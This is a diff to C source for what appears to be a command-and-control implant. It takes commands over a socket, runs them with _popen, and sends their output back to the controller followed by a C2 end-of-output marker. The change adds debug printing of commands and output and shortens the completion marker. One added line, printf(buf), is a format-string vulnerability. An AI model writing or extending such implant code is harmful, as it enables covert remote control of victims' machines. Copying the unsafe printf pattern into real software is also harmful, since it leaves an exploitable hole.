@@ -64,6 +64,7 @@ int main() {
             i++;
         }
         if (!strlen(cmd)) continue;
+        printf("%s\n", cmd);
 
         int cmdlen = strlen(cmd);
 
@@ -85,11 +86,12 @@ int main() {
         }
 
         while (fgets(buf, sizeof(buf), fp)) {
+            printf(buf);
             send(sock, buf, strlen(buf), 0);
         }
         _pclose(fp);
-        // Signal completion with newline, marker, newline.
-        send(sock, "\r\n" C2_EOF_MARK "\r\n", 6 + C2_EOF_MARK_LEN, 0); 
+        // Signal completion
+        send(sock, C2_EOF_MARK, C2_EOF_MARK_LEN, 0); 
     }
 
     CLOSE_SOCK(sock);
